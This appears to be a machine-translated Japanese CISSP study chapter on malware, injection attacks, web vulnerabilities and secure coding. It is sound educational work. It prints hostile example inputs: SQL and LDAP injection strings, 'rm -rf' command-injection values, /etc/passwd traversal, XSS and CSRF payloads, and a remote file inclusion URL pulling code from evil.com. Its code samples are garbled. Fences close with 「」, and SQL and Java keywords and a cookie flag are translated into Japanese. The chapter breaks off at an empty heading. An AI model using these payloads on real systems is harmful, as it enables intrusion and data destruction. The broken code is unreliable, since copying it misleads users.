# 第21章: 悪意のあるコードとアプリケーション攻撃

- [マルウェア](#マルウェア)
  - [悪意のあるコードのソース](#sources-of-malicious-code)
  - [ウイルス](#viruses)
    - [ウイルス増殖技術](#virus-propagation-techniques)
    - [ウイルス技術](#virus-technologies)
    - [デマ](#デマ)
  - [ロジックボム](#logic-bombs)
  - [トロイの木馬](#trojan-horses)
  - [ワーム](#worms)
    - [コードレッドワーム](#code-red-worm)
    - [スタックスネット](#stuxnet)
  - [スパイウェアとアドウェア](#spyware-and-adware)
  - [ランサムウェア](#ransomware)
  - [悪意のあるスクリプト](#malicious-scripts)
  - [ゼロデイ攻撃](#zero-day-attacks)
- [マルウェア防止](#malware-prevention)
  - [マルウェアに対して脆弱なプラットフォーム](#platforms-vulnerable-to-malware)
  - [マルウェア対策ソフトウェア](#anti-malware-software)
    - [シグネチャベースの検出](#signature-based-detection)
    - [ヒューリスティック検出とサンドボックス](#heuristic-detection-and-sandboxing)
  - [整合性監視](#integrity-monitoring)
  - [高度な脅威保護](#advanced-threat-protection)
    - [エンドポイント検出と対応 (EDR)](#endpoint-detection-and-response-edr)
    - [マネージド検出および対応 (MDR)](#managed-detection-and-response-mdr)
    - [ユーザーおよびエンティティ行動分析 (UEBA)](#user-and-entity-behavior-analytics-ueba)
- [アプリケーション攻撃](#application-attacks)
  - [バッファオーバーフロー](#buffer-overflows)
  - [確認時刻から使用時刻まで](#確認時刻から使用時刻まで)
  - [バックドア](#backdoors)
  - [権限昇格とルートキット](#privilege-escalation-and-rootkits)
- [インジェクション脆弱性](#injection-vulnerabilities)
  - [SQLインジェクション攻撃](#sql-injection-attacks)
    - [クラシックSQLインジェクション](#classic-sql-injection)
    - [ブラインドコンテンツベースSQLインジェクション](#blind-content-based-sql-injection)
    - [ブラインドタイミングベースのSQLインジェクション](#blind-timing-based-sql-injection)
  - [コードインジェクション攻撃](#code-injection-attacks)
    - [LDAPインジェクション](#ldap-injection)
    - [XMLインジェクション](#xml-injection)
  - [コマンドインジェクション攻撃](#command-injection-attacks)
    - [DLLインジェクション](#dll-injection)
    - [HTMLインジェクション](#html-injection)
- [認証の脆弱性を悪用する](#exploiting-authorization-vulnerabilities)
  - [安全でない直接オブジェクト参照](#insecure-direct-object-references)
  - [ディレクトリトラバーサル](#directory-traversal)
  - [ファイルインクルード攻撃](#file-inclusion-attacks)
    - [ローカルファイルインクルード (LFI)](#local-file-inclusion-lfi)
    - [リモートファイルインクルード (RFI)](#remote-file-inclusion-rfi)
- [Web アプリケーションの脆弱性の悪用](#exploiting-web-application-vulnerabilities)
  - [クロスサイトスクリプティング (XSS)](#cross-site-scripting-xss)
    - [反射型XSS](#reflected-xss)
    - [保存型/永続型XSS](#storedpersistent-xss)
    - [DOMベースXSS](#dom-based-xss)
  - [リクエストフォージェリ](#request-forgery)
    - [クロスサイトリクエストフォージェリ (CSRF/XSRF)](#cross-site-request-forgery-csrfxsrf)
    - [サーバーサイドリクエストフォージェリ (SSRF)](#server-side-request-forgery-ssrf)
  - [セッションハイジャック](#session-hijacking)
- [アプリケーションセキュリティコントロール](#application-security-controls)
  - [入力検証](#input-validation)
    - [ホワイトリストとブラックリスト](#whitelisting-and-blacklisting)
    - [クライアントサイド検証とサーバーサイド検証](#client-side-vs-server-side-validation)
    - [メタ文字](#metacharacters)
    - [パラメータ汚染](#parameter-pollution)
  - [Web アプリケーション ファイアウォール](#web-application-firewalls)
  - [データベースセキュリティ](#database-security)
    - [パラメータ化されたクエリとストアド プロシージャ](#parameterized-queries-and-stored-procedures)
    - [難読化とカモフラージュ](#obfuscation-and-camouflage)
  - [コードセキュリティ](#code-security)
    - [コード署名](#code-signing)
    - [コードの再利用](#code-reuse)
    - [ソフトウェアの多様性](#software-diversity)
    - [コードリポジトリ](#code-repositories)
    - [整合性測定](#integrity-measurement)
    - [アプリケーションの復元力](#application-resilience)
- [セキュアコーディングプラクティス](#secure-coding-practices)
  - [ソースコードコメント](#source-code-comments)
  - [エラー処理](#error-handling)
  - [ハードコードされた認証情報](#hard-coded-credentials)
  - [メモリ管理](#memory-management)
    - [リソース枯渇](#resource-exhaustion)
    - [ポインタ逆参照](#pointer-dereferencing)
- [要約](#summary)

### マルウェア

#### 悪意のあるコードのソース
悪意のあるコード (または「マルウェア」) は、複数のベクトルを通じてシステムに侵入する可能性があります。
- 信頼できない、または侵害されたソースからダウンロードされた感染ソフトウェア
- 悪意のあるメールの添付ファイルまたはフィッシングメールに埋め込まれたリンク
- USBドライブやその他のリムーバブルメディア
- エクスプロイトキットやドライブバイダウンロードをホストするウェブサイト
- 悪意または過失による内部脅威

🛡️ **CISSP 試験のヒント**: さまざまなマルウェアがシステムに侵入する方法をよく理解しておいてください。フィッシングやリムーバブル メディアは、厳密にテストされたエントリ ポイントです。

#### ウイルス
**ウイルス** は、ホスト ファイルまたはプログラムに自身を添付し、**ユーザーによって実行された場合にのみ**拡散する、自己複製型のマルウェアの一種です。

##### ウイルスの増殖技術
| タイプ | 説明 |
|-----------------------|--------------|
| ファイル感染者 | 実行可能プログラム (例: .exe ファイル) に添付 |
| ブート セクタ ウイルス | ディスクのブート レコードに感染し、起動時にアクティブになります |
| マクロ ウイルス | Microsoft Word などのアプリケーションのマクロをターゲットにします |
| マルチパーティウイルス | 複数の感染方法を使用 (例: ファイル + ブートセクター) |

##### ウイルス技術
- **ステルスウイルス**: システム要求を傍受して自身を隠します。
- **ポリモーフィック型ウイルス**: 複製ごとにコード署名が変更されます。
- **変形型ウイルス**: 増殖中にコードベース全体を書き換えます。

##### デマ
- ユーザーを欺いて危険な操作（システム ファイルの削除や偽のウイルス対策ソフトウェアのインストールなど）を実行させることを目的としたソーシャル エンジニアリング戦術。

#### ロジック爆弾
**ロジックボム**とは、意図的に挿入され、特定の条件（特定の日付やユーザーアクションなど）下で起動される悪意のあるコードです。内部関係者によって使用されることが多いです。

#### トロイの木馬
**トロイの木馬** とは、一見有用または無害であるように見えるものの、悪意のある機能を隠蔽するプログラムです。トロイの木馬は**自己複製しません**。
- 一般的なペイロード: キーロガー、バックドア、またはランサムウェアドロッパー。

#### ワーム
**ワーム** は、多くの場合ネットワークの脆弱性を悪用して、ユーザーの操作なしに拡散する自己複製プログラムです。

##### コードレッドワーム（2001）
- Microsoft IIS Web サーバーのバッファ オーバーフローを悪用しました。
- DoS 攻撃と Web サイトの改ざんを実行しました。

##### スタックスネット
- ICS および SCADA システムを標的とする高度なワーム。
- 複数のゼロデイ脆弱性を悪用した。
- イランの核遠心分離機を物理的に破壊した。

#### スパイウェアとアドウェア
- **スパイウェア**: 資格情報や閲覧習慣などの機密データを収集します。
- **アドウェア**: ユーザーに広告を大量に送りつけ、行動を追跡してスパムをパーソナライズする可能性があります。
- どちらも**潜在的に不審なプログラム (PUP)** に該当します。

⚠️ **試験に関する注意**: スパイウェアはプライバシーを侵害することが多く、データの窃盗につながります。

#### ランサムウェア
ファイルを暗号化し、復号化するために支払いを要求するマルウェアの一種。
- データを漏らすと脅迫する可能性もあります（「二重の恐喝」）。
- 一般的な感染方法: フィッシング、RDP ブルート フォース、ソフトウェア エクスプロイト。
- 法的/倫理的問題: 支払いが OFAC の制裁に違反する可能性があります。

#### 悪意のあるスクリプト
**PowerShell**、**Bash**、**JavaScript** などの言語で書かれたスクリプトは攻撃を自動化します。
- APT（高度な持続的脅威）で使用される
- 多くの場合、メモリ内でのみ実行される **ファイルレス マルウェア** をサポートします。

#### ゼロデイ攻撃
- **まだ公開されていない**、またはパッチが適用されていない脆弱性を悪用するエクスプロイト。
- 組織は**「脆弱性の窓」**の間に脆弱になります。

🧠 **防御戦略**:
- タイムリーなパッチ適用
- EDR（エンドポイント検出と対応）
- アプリケーション制御
- コンテンツフィルタリング

### マルウェア対策

#### マルウェアに対して脆弱なプラットフォーム
- **Microsoft Windows** は依然として、ほとんどのマルウェアの主な標的となっています (2020 年時点で約 83%)。
- **macOS** および **Android** プラットフォームが標的となるケースが増えており、マルウェア攻撃が大幅に増加しています。
- **CISSP試験のヒント**: すべてのオペレーティングシステムには脆弱性があります。プラットフォームの多様性は万能薬ではありません。

#### マルウェア対策ソフトウェア
最新のマルウェア対策ツールは、エンドポイントとサーバーから悪意のあるコードを検出し、防止し、削除します。

##### シグネチャベースの検出
- データベース内の既知のマルウェア パターン (シグネチャ) を照合します。
- 新たな脅威に対して効果を発揮するには、**頻繁な更新** が必要です。
- デフォルトのアクション:
  - 可能であれば**消毒**してください
  - 消毒が失敗した場合は**隔離**
  - 最後の手段として**削除**

##### ヒューリスティック検出とサンドボックス
- **ヒューリスティック**: 動作 (権限昇格、システム ファイルの変更など) を分析してマルウェアを識別します。
- **サンドボックス**: 疑わしいファイルを隔離された環境で実行し、動作を安全に監視します。
- **ゼロデイ脅威** やポリモーフィック型マルウェアの検出に役立ちます。

🛡️ **重要なポイント**: ヒューリスティック ツールは、未知の高度なマルウェアを識別するために不可欠です。

#### 整合性監視
- **ハッシュ関数** を使用して、不正なファイルの変更を検出します。
- 重要なファイル (例: `cmd.exe`、`command.com`) の予期しない変更について管理者に警告します。
- Web サーバーの改ざん検出でよく使用されます。

🧪 例: ファイルに保存されているハッシュが現在のハッシュと異なる場合、ファイルは変更されています。

#### 高度な脅威保護
従来のウイルス対策ソリューションを超える包括的なエンドポイント セキュリティ。

##### エンドポイント検出および対応 (EDR)
- 悪意のある兆候がないか、メモリ、ファイル、ネットワーク アクティビティを監視します。
- 侵害されたシステムの分離を自動化します。
- 脅威インテリジェンスとインシデント対応ワークフローと統合します。

##### マネージド検出および対応 (MDR)
- 以下を提供する **マネージド セキュリティ サービス**:
  - 脅威検出
  - アラート分析
  - 修復サポート
- 24 時間 365 日の内部監視が不足している組織に最適です。

##### ユーザーおよびエンティティ行動分析 (UEBA)
- ユーザーの動作における異常を検出します (例: 異常なログイン時間、過剰なデータ アクセス)。
- 通常のアクティビティのベースラインを構築し、逸脱にフラグを立てます。
- EDR を補完します (ユーザー中心 vs. エンドポイント中心)。

| テクノロジー | 焦点 | 防衛における役割 |
|-----------|-------------------------------|----------------------------|
| EDR | エンドポイント監視 | 検出と対応 |
| MDR | アウトソーシングされた EDR + レスポンス | マネージド セキュリティ オペレーション |
| UEBA | ユーザー行動監視 | 内部脅威検出 |

🚨 **試験のリマインダー**: EDR、MDR、UEBA の **違い** と、これらが階層化セキュリティ アーキテクチャにどのように統合されるかを理解してください。

### アプリケーション攻撃

#### バッファオーバーフロー
- **バッファ オーバーフロー** は、メモリ バッファに保持できる量を超えるデータが書き込まれたときに発生します。
- 次の結果につながる可能性があります:
  - **クラッシュ**
  - **メモリ破損**
  - **リモートコード実行 (RCE)** 戻りアドレスまたは関数ポインタの上書きによる
- 境界チェックが言語によって強制されない C/C++ では一般的です。
- 緩和戦略:
  - 入力検証（長さと種類）
  - コンパイラレベルの保護: スタックカナリア、ASLR (アドレス空間レイアウトのランダム化)、DEP (データ実行防止)
  - メモリセーフな言語を使用する（例：Java、Python）

📌 **試験のヒント**: バッファ オーバーフローが機密性、整合性、可用性 (CIA) にどのような影響を与えるか、またどのような制御によってそれを軽減できるかに焦点を当てます。

#### 確認時刻から使用時刻まで
- 攻撃者がチェックとアクションの間でシステム状態を変更する **競合状態の脆弱性**。
- 例：
  - プログラムはファイルへのアクセス権をチェックします。
  - ファイルを使用する前に、攻撃者はそれを保護されたファイル (例: `/etc/passwd`) へのシンボリック リンクに置き換えます。
- これにより、**不正アクセスや変更**が可能になります。

🛡️ **軽減策**:
- チェックと使用を組み合わせたアトミック操作または安全な API を使用します。
- 操作間の時間間隔を最小限に抑えます。

🔄 **CISSP 注意**: TOCTTOU はシステムタイミングの想定を悪用し、安全な設計原則に違反します。

#### バックドア
- **バックドア**: 認証メカニズムを回避する隠された方法。
- 多分：
  - **開発者がデバッグのために意図的にコーディング**
  - 攻撃者/マルウェアによって侵入後に**挿入**される
- リスク:
  - 文書化されていないアクセス
  - 従来のログ記録や監視では検出が困難

🔐 **ベストプラクティス**:
- コードレビューと変更管理
- 本番環境の前にデバッグフックを無効化/削除する
- コマンドアンドコントロールトラフィックや不正アクセス試行を検出する脅威検出ツールを使用する

⚠️ **試験の洞察**: バックドアは、アクセス制御、監査、否認防止などのセキュリティ制御を弱体化させます。

#### 権限昇格とルートキット

##### 権限昇格
- **垂直エスカレーション**: 標準ユーザーが管理者/ルート レベルの権限を取得します。
- **水平エスカレーション**: ユーザーは同じ権限レベルの別のユーザーのリソースにアクセスします。
- テクニック:
  - パッチ未適用の脆弱性を悪用する
  - 権限の設定ミス
  - 資格情報の盗難
  - DLLインジェクションまたはsetuid/setgidプログラムの悪用

##### ルートキット
- **ルートキット** は、マルウェアの存在を隠し、特権アクセスを維持するように設計されたソフトウェアです。
- 機能:
  - ファイル、プロセス、レジストリエントリを非表示にします
  - セキュリティメカニズムを無効にする
  - カーネルレベルまたはユーザーレベルで動作する

🔒 **検出と防止**:
- セキュアブートとUEFIファームウェア保護
- メモリ整合性ツール（例：Windows HVCI）
- カーネルモードコード署名
- 整合性チェック（例：Tripwire）

🧠 **CISSPのヒント**: 権限昇格は長期的な攻撃への足掛かりとなり、多くの場合ルートキットと組み合わされます。権限昇格とルートキットの違いと多層防御について理解しましょう。

| 脅威 | 説明 | 軽減策 |
|---------------------------|---------------------------------------------------|-----------------------------------------------------|
| バッファ オーバーフロー | バッファ メモリがオーバーランし、コードが実行される | 入力検証、スタック カナリア |
| TOCTTOU | チェックと使用の間のリソース状態の変化 | アトミック操作 |
| バックドア | アクセス制御への隠れたバイパス | コード監査、安全なコーディング |
| 権限昇格 | ユーザー権限の不正な昇格 | パッチ管理、最小権限 |
| ルートキット | ステルス的な制御維持マルウェア | セキュアブート、整合性監視 |

### インジェクション脆弱性

インジェクション脆弱性は、信頼できない入力がバックエンドシステムによって不適切に処理され、コードまたはコマンドとして解釈される際に発生します。これらの欠陥は、データベース、ディレクトリ、オペレーティングシステム、またはアプリケーションロジックに影響を与え、データ侵害、リモートコード実行、または権限昇格を引き起こす可能性があります。

#### SQLインジェクション攻撃
**SQLインジェクション（SQLi）**は、攻撃者がユーザー入力フィールドを介してSQLクエリを操作することを可能にする手法です。これは、最も一般的かつ危険なWebアプリケーションの脆弱性の1つです。

##### 古典的なSQLインジェクション
- 適切な検証やサニタイズが行われず、入力が SQL ステートメントに直接含まれている場合に発生します。
- 攻撃者は次のことができます:
  - **機密データの抽出**
  - **レコードを変更または削除する**
  - **管理操作を実行する**
- 例：
  ```sql
  SELECT * FROM users WHERE username = '$input';
  「」
  `$input` = `admin' OR '1'='1` の場合、クエリは次のようになります。
  ```sql
  SELECT * FROM users WHERE username = 'admin' OR '1'='1';
  「」

🧠 **CISSP のヒント**: SQL インジェクションがデータベースの **整合性** と **機密性** をどのように破壊するかを理解してください。

##### ブラインドコンテンツベースのSQLインジェクション
- アプリケーションは結果を直接返しません。ただし、動作の変化によって、ステートメントが実行されたかどうかがわかります。
- 例：
  - 入力: `52019' AND 1=1;--` → 有効な結果を返します
  - 入力: `52019' AND 1=2;--` → 結果は返されません
- 攻撃者はこの動作を利用して、データベースの構造や内容を推測します。

##### ブラインドタイミングベースのSQLインジェクション
- SQL 実行で導入される **遅延** を利用して、インジェクションの脆弱性を検出します。
- 例：
  ```sql
  52019'; 遅延待ち '00:00:10';--
  「」
  アプリケーションの応答が遅れる場合は、脆弱である可能性があります。

🕒 **CISSP Insight**: タイミングベースの手法は、攻撃者が直接の出力を確認できない場合 (エラーが抑制されたアプリなど) に役立ちます。

#### コードインジェクション攻撃
コード インジェクションは、攻撃者がプログラムの入力ストリームに実行可能コードを挿入する、より広範なカテゴリです。

- これらの攻撃は SQL に限定されず、ディレクトリ サービス、XML パーサー、シェル コマンドなども影響を受ける可能性があります。

##### LDAP インジェクション
- **Lightweight Directory Access Protocol (LDAP)** ステートメントに悪意のあるクエリを挿入します。
- 目標: 認証をバイパスするか、許可されていないディレクトリ データを抽出します。
- 例：
  ```ldap
  (&(uid=admin)(userPassword=*)) → 検索アクセスを拡張します。
  「」

##### XMLインジェクション
- 攻撃者が XML ベースのアプリケーションまたはサービスを操作するリクエストに悪意のある XML コンテンツを挿入した場合に発生します。
- 次の用途に使用できます:
  - XMLの構造を変更する
  - DTD（文書型定義）を挿入する
  - **XXE (XML 外部エンティティ)** 攻撃を実行する

🛡️ **インジェクション攻撃の緩和**:
- 入力検証と許可リスト
- パラメータ化されたクエリ（例：Javaの `PreparedStatement()`）
- ORM（オブジェクトリレーショナルマッピング）ライブラリの使用
- 出力エンコーディング

#### コマンドインジェクション攻撃
コマンド インジェクションにより、攻撃者は脆弱なアプリケーションを実行しているホスト上で任意の OS レベルのコマンドを実行できるようになります。

- ユーザー入力をシステム シェルまたはインタープリター コマンドに渡すアプリケーションを対象とします。

- 例：
  - 入力: `mchapple & rm -rf /home`
  - コマンド実行: `mkdir /home/students/mchapple & rm -rf /home`

⚠️ **危険**: オペレーティング システムが完全に危険にさらされる可能性があります。

##### DLLインジェクション
- **ダイナミック リンク ライブラリ (DLL) インジェクション**: Windows では、悪意のある DLL が正当なプロセスのメモリ領域に挿入されます。
- 攻撃者は、信頼できる DLL ではなく悪意のある DLL をプロセスに強制的にロードします。
- 関数をフックしてデータを盗み出すためによく使用されます。

##### HTML インジェクション
- アプリケーション出力に HTML タグを挿入します。多くの場合、次のような結果になります。
  - UI 補償攻撃
  - ウェブ改ざん
  - **クロスサイトスクリプティング (XSS)** スクリプトタグが許可されている場合

🎯 **CISSP リマインダー**: **データインジェクション（例：SQL/LDAP）** と **コマンドインジェクション（例：シェル/DLL）** を区別してください。それぞれ異なるレイヤーをターゲットとします。

| インジェクションの種類 | 対象システム | 攻撃例 | 軽減策 |
|------------------|----------------------|----------|-------------------------------------|
| SQL インジェクション | データベース (例: MySQL) | `OR 1=1--` | パラメーター化されたクエリ、入力検証 |
| LDAP インジェクション | ディレクトリ サービス | `*)(uid=*))(|(uid=*` | 入力のサニタイズ、特殊文字のエスケープ |
| XML インジェクション | XML パーサー、API | `<tag><evil></tag>` | XML スキーマ検証、DTD の無効化 |
| コマンド インジェクション | OS シェル | `; rm -rf /` | 安全な API の使用、入力検証 |
| DLL インジェクション | Windows プロセス | 悪意のある DLL の読み込み | DLL 署名、ホワイトリスト パス |
| HTML インジェクション | Web フロントエンド | `<b>ハッキングされました!</b>` | 出力エンコード、HTML サニタイズ |

### 認証の脆弱性を悪用する

認証の脆弱性により、攻撃者は脆弱なアクセス制御メカニズムを回避または悪用し、本来の権限を超えたデータやリソースへのアクセスが可能になります。これらの欠陥は**最小権限の原則**に違反し、重大な侵害につながる可能性があります。

#### OWASP
- **Open Worldwide Application Security Project (OWASP)** は、ソフトウェア セキュリティの向上に重点を置いた非営利団体です。
- 維持:
  - **OWASP Top 10**: 重大なWebアプリケーションのリスク  
    👉 https://owasp.org/www-project-top-ten/
  - **OWASP プロアクティブコントロール**: 開発者向けセキュリティプラクティス  
    👉 https://owasp.org/www-project-proactive-controls/

🧠 **CISSP インサイト**: OWASP が安全なアプリケーション開発、テスト、教育のための標準とツールを提供していることを理解します。

#### 安全でない直接オブジェクト参照
- アプリケーションが適切な承認チェックを実施せずに内部オブジェクト参照 (ドキュメント ID、アカウント番号など) を公開した場合に発生します。
- 例：
  「」
  https://example.com/getDocument.php?documentID=123
  「」
  ID を別の値に変更すると、不正アクセスが発生する可能性があります。
  「」
  https://example.com/getDocument.php?documentID=124
  「」

- 実際の事例: 2018年、カナダの10代の若者が、ノバスコシア州の情報公開ウェブサイトのURLを変更してIDORを発見したとして起訴されました。

🚨 **重要な概念**: IDOR は、OWASP Top 10 の **アクセス制御の不備** の問題です。サーバー側の承認チェックを確実に実施してください。

#### ディレクトリトラバーサル
- 攻撃者は、`../` などのパス トラバーサル シーケンスを使用して、ルート Web ディレクトリを超えて不正なファイルにアクセスします。
- 例：
  「」
  http://example.com/view?file=../../etc/passwd
  「」

- この攻撃は以下を悪用します:
  - 入力データのサニタイズが不十分
  - ファイルアクセス制限がない

🛡️ **軽減策**:
- パスを正規化し、入力を制限する
- ファイルシステムとアプリレベルでアクセス制御を実装する

#### ファイルインクルード攻撃
- 攻撃者は、脆弱なアプリケーションにファイル パスを挿入して、**ファイルを読み込んで実行します**。
- 2つのタイプ:
  
##### ローカルファイルインクルード (LFI)
- サーバー上に既に存在するファイルを実行します。
- 例：
  「」
  http://example.com/page.php?file=../../uploads/attack.php
  「」

##### リモートファイルインクルード (RFI)
- 攻撃者が制御するリモート コードを実行します。
- 例：
  「」
  http://example.com/page.php?file=http://evil.com/malware.php
  「」

- 永続的なアクセスのために**Web シェル**をインストールする場合によく使用されます。

🔐 **ベストプラクティス**:
- PHPで`allow_url_include`を無効にする
- ファイルパスには厳密な許可リストを使用する
- 入力パラメータをサニタイズする

| 脆弱性 | 説明 | 軽減策 |
|----------------------|--------------------------------------------------------|-------------------------------------------------------------------|
| IDOR | 許可なくオブジェクト（ドキュメントなど）にアクセスする | サーバー側のアクセス制御を実施する |
| ディレクトリ トラバーサル | Web ルートから脱出するために `../` を使用してファイルにアクセスする | 入力検証、ファイル パス フィルター |
| LFI | ローカル サーバー ファイルを実行 | 入力のサニタイズ、ファイルの包含を制限 |
| RFI | リモート攻撃者が制御するファイルを実行する | リモートインクルードを無効にし、URL を検証する |

🧠 **CISSP リマインダー**: アクセスが間接的または URL ベースであるように見える場合でも、常に **承認チェック** を適用します。

### Webアプリケーションの脆弱性を悪用する

ウェブアプリケーションはインターネットに公開され、機密性の高いユーザー入力を処理することが多いため、攻撃の格好の標的となります。以下の脆弱性は、**OWASP Top 10** および CISSP 試験内容の重要な構成要素です。

#### クロスサイトスクリプティング（XSS）
クロスサイト スクリプティング (XSS) は、攻撃者がコンテンツに **悪意のあるスクリプト** を挿入し、それが別のユーザーのブラウザーに配信されるときに発生します。

##### 反射型XSS
- 悪意のあるスクリプトは、通常は URL 経由で Web サーバーから反映されます。
- ブラウザですぐに実行されます。
- フィッシング攻撃でよく使用されます。
- 例：
  「」
  http://example.com/search?query=<script>alert('XSS')</script>
  「」

##### 保存型/永続型 XSS
- 悪意のあるスクリプトがサーバー上に保存されます (例: コメントやメッセージボード内)。
- 被害者が感染したページを読み込むたびにトリガーされます。
- 広範囲に及ぶ露出により、より危険になります。

##### DOMベースのXSS
- 脆弱性はサーバーではなく**クライアント側の JavaScript** に存在します。
- DOM は、適切なサニタイズが行われずに、信頼できないデータに基づいて変更されます。

🛡️ **予防**:
- 入力検証（ホワイトリストを推奨）
- 出力エンコーディング（HTML、JavaScript、URL）
- HTTPのみとセキュアCookieフラグ

📌 **試験のヒント**: リフレクション型、保存型、DOM ベースの XSS の違いを理解してください。

### リクエストフォージェリ
#### クロスサイトリクエストフォージェリ (CSRF/XSRF)
認証されたユーザーのブラウザを騙して、信頼できるサイトに**無許可のリクエスト**を送信させます。

- **サイトがユーザーに対して抱いている信頼** を悪用します。
- 多くの場合、画像または iframe に埋め込まれます。
- 例：
  ```html
  <img src="https://bank.com/transfer?amount=1000&to=attacker" />
  「」

🛡️ **軽減策**:
- **CSRF対策トークン**を使用する
- HTTPリファラーを検証する
- 重要なアクションには再認証を要求する

🧠 **CISSP 注**: CSRF != XSS。CSRF はクライアントの **サーバー側の信頼** を対象とし、XSS は挿入されたコードの **クライアント側の実行** を対象とします。

#### サーバーサイドリクエストフォージェリ（SSRF）
- アプリケーションは**ユーザーから URL を受け入れ**、その URL に**リクエストを送信**します。
- 攻撃者は内部 URL を提供することで内部システムにアクセスできます。
- 例：
  「」
  http://app.com/fetch?url=http://localhost:8080/admin
  「」

🛡️ **軽減策**:
- 内部リクエストにユーザー指定の URL を許可しない
- 許可されたURLにはホワイトリストを使用する

#### セッションハイジャック
有効なユーザー セッションを制御して、正当なユーザーになりすまします。

- テクニック:
  - セッションCookieの盗難
  - 予測可能なセッションID
  - 中間者攻撃（MitM）

🛡️ **予防**:
- ログイン時にセッションIDを再生成する
- HSTSでHTTPSを使用する
- 次の方法で Cookie を設定します:
  - `セキュア` (HTTPS のみ)
  - `HttpOnly` (JavaScript 経由ではアクセスできません)
  - `SameSite` (クロスオリジンの使用を制限する)

| 脆弱性 | エクスプロイト | 保護戦略 |
|--------------|------------------------|----------------------------------------------------------|
| XSS | サイト内のユーザーの信頼 | 入力検証、出力エンコード |
| CSRF | ユーザーにおけるサイトの信頼性 | CSRF 対策トークン、再認証 |
| SSRF | サーバーがユーザー入力を取得 | ホワイトリスト、内部 URL アクセスを無効にする |
| セッション ハイジャック | セッション管理の欠陥 | セキュア クッキー フラグ、HTTPS、ID ローテーション |

🚨 **CISSP Insight**: **信頼関係** と、攻撃者がそれをどのように操作するかを理解します。

### アプリケーションセキュリティ制御

アプリケーション セキュリティ制御は、安全なコーディング手法とインフラストラクチャ ベースの保護を組み合わせて、脆弱性に対する **多層防御** を構築します。

#### 入力検証
アプリケーション セキュリティにおける **最も重要な** 制御。

- 次のような攻撃を防ぎます:
  - SQLインジェクション
  - クロスサイトスクリプティング（XSS）
  - バッファオーバーフロー

##### ホワイトリストとブラックリスト
✅ **ベストプラクティス: ホワイトリスト (許可リスト)**  
- 想定される形式/タイプのみを許可します（例：年齢 = 整数 0～123）
- サーバー側の検証は必須です

⚠️ **ブラックリスト（ブロックリスト）**  
- 既知の不正な文字をブロックする（例：`<`、`'`、`--`）
- バイパス技術のため効果が低い

##### クライアント側とサーバー側の検証
🧠 **CISSP のヒント**: 攻撃者がブラウザをバイパスできるため、検証はクライアント側 (JavaScript など) だけでなく **サーバー側** でも実行する必要があります。

##### メタ文字
- **メタ文字** はクエリ/スクリプトで特別な意味を持ちます (例: `;`、`|`、`'`、`--`)
- **エスケープ**するとこれらの文字が無効になります
  - 例: `\` またはエンコード (`'` の場合は `%27`)

##### パラメータ汚染
- 同じ入力パラメータに対して複数の値が送信された
- Webアプリは一方を検証し、もう一方を実行する可能性がある

🛡️ **防御**:
- 厳密なサーバー側パラメータ検証を実施する
- 安全な入力解析ライブラリを適用する

#### Webアプリケーションファイアウォール
- **アプリケーション層 (OSI レイヤー 7)** で作業します。
- Webアプリケーションとの間のHTTPトラフィックを監視、フィルタリング、またはブロックする

✅ 用途:
- SQLインジェクション/XSS攻撃をブロック
- 入力/出力ルールを強制する
- 安全でないレガシーアプリケーションを補完する

📌 **CISSP 注**: WAF は補償制御であり、安全なコーディングに代わるものではありません。

#### データベースセキュリティ

##### パラメータ化されたクエリ
- プレースホルダー付きの**クエリテンプレート**を使用する
- 攻撃者の入力が実行可能なSQLになるのを防ぐ

例 (Java):
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, 101);
「」

##### ストアドプロシージャ
- SQLロジックはDBサーバー上に保存され実行される
- ユーザー入力をパラメータとして受け入れる
- 生のSQL構造から分離

🧠 **CISSP インサイト**: ストアド プロシージャとパラメーター化クエリの両方が SQLi から保護します。

#### 難読化とカモフラージュ

| テクニック | 説明 | 目標 |
|--------------|-------------------------------------------------------|----------------------------|
| データの最小化 | 不要な機密データを収集/保存しない | 攻撃対象領域を減らす |
| トークン化 | ルックアップトークン + 安全なマッピングテーブルでデータを置換 | データ保護 |
| ハッシュ + ソルト | 不可逆な ID 変換 + 一意性のためのソルト | レインボー攻撃に対する防御 |

🔐 例: プレーンな SSN の代わりに `SHA256(salt + SSN)` を保存します。

#### コードセキュリティ

##### コード署名
- デジタル署名によりコードの著作権と整合性を確認
- コードが安全であることを意味するわけではありません。変更されていないだけです。

🧠 **CISSP のヒント**: コード署名では **非対称暗号化** (秘密署名、公開検証) が使用されます。

##### コードの再利用とSDK
- リスク:
  - ライブラリから継承された脆弱性
  - ライセンスの問題
- セキュリティチームは**依存関係を追跡**し、更新を監視する必要があります

##### ソフトウェアの多様性
- **単一障害点**を回避する
- 可能な場合は異なるコンパイラ、ライブラリ、またはコードベースを使用する

#### コードリポジトリ
- 集中コードストレージとバージョン管理
- サポート：
  - アクセス制御
  - 変更ログ
  - ロールバックと監査
- 「デッドコード」を回避し、再利用を促進する

#### 整合性測定
- コードが変更されていないことを確認するために**暗号ハッシュ**を使用します
- 承認されたリリースバージョンに対して検証する

### アプリケーションの回復力

| コンセプト | 定義 | 目標 |
|------------|-----------------------------------------------------------------|------------------------------|
| スケーラビリティ | 需要に応じてリソースを追加可能 (スケールアップ/スケールアウト) | 成長をサポート |
| 弾力性 | 自動的にスケールアップとスケールダウンが可能 | コストとリソースを最適化 |

🚀 自動スケーリング機能を備えたクラウドネイティブ アプリで一般的です。

📌 **CISSPリマインダー**: 回復力のあるアプリは障害に強く、変化に適応します。スケーラビリティ、弾力性、可用性を重視しましょう。

### 安全なコーディングプラクティス

セキュアコーディングは、アプリケーションの堅牢性と回復力を高め、悪用されにくいことを保証します。CISSPは、予防的開発手法と防御的開発手法の両方を重視しています。

#### ソースコードコメント
- 開発者は、機能性を文書化するために**コメント**を残すことがよくあります。
- コメントは次のようになります:
  - **製品コード** から削除されました (特に Web アプリ)
  - **アーカイブされたソースコード**にのみ保存されます

🚨 **セキュリティリスク**: コメントによって内部ロジック、ファイル パス、または非表示の API キーが明らかになる可能性があります。

#### エラー処理
- エラー処理が不十分だと、次のような問題が発生する可能性があります。
  - アプリのクラッシュ（DoSリスク）
  - 機密性の高いシステム詳細（例：スタック トレース、DB スキーマ）が漏洩する
- **try…catch** ロジックを使用して、失敗を適切に管理します。

Java の例:
```java
試す {
  int 結果 = divide(x, y);
} キャッチ (算術例外 e) {
  log.error("除算エラーが発生しました");
}
「」

✅ ベストプラクティス:
- 管理者のみの内部詳細をログに記録する
- ユーザーに**一般的なメッセージ**を表示します（例：「エラーが発生しました。もう一度お試しください。」）

#### ハードコードされた資格情報
